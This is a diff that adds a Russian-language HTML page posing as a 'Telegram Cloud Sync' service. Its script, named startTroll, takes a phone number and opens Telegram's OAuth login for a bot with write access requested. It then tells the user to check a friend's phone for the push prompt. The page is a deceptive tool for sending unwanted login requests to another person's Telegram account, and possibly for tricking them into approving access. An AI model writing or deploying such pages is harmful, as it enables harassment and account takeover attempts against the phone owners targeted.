@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Cloud Sync</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%);
+            font-family: 'Segoe UI', sans-serif;
+            overflow: hidden;
+        }
+
+        .glass-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 40px;
+            width: 340px;
+            text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+        }
+
+        h2 { color: white; margin-bottom: 20px; font-weight: 500; }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #0088cc;
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover { background: #00aaff; transform: translateY(-2px); }
+    </style>
+</head>
+<body>
+
+<div class="glass-card">
+    <h2>Cloud Sync</h2>
+    <input type="text" id="phone" placeholder="+79991234567">
+    <button onclick="startTroll()">ИНИЦИИРОВАТЬ</button>
+</div>
+
+<script>
+function startTroll() {
+    const phone = document.getElementById('phone').value.replace(/\D/g,'');
+    if(!phone) return alert("Введите номер!");
+
+    // Это ИМЯ ТВОЕГО БОТА (без @). Обязательно создай его в BotFather!
+    const botName = "8791295405"; 
+    
+    // Прямая ссылка на авторизацию. Telegram увидит номер и отправит пуш.
+    const url = `https://oauth.telegram.org/auth?bot_id=${botName}&origin=${window.location.origin}&embed=1&request_access=write&phone=${phone}`;
+    
+    // Открываем маленькое окно (как это делает фрагмент)
+    window.open(url, "tg_auth", "width=400,height=500");
+    
+    alert("Запрос отправлен! Проверяй телефон друга.");
+}
+</script>
+
+</body>
+</html>
+
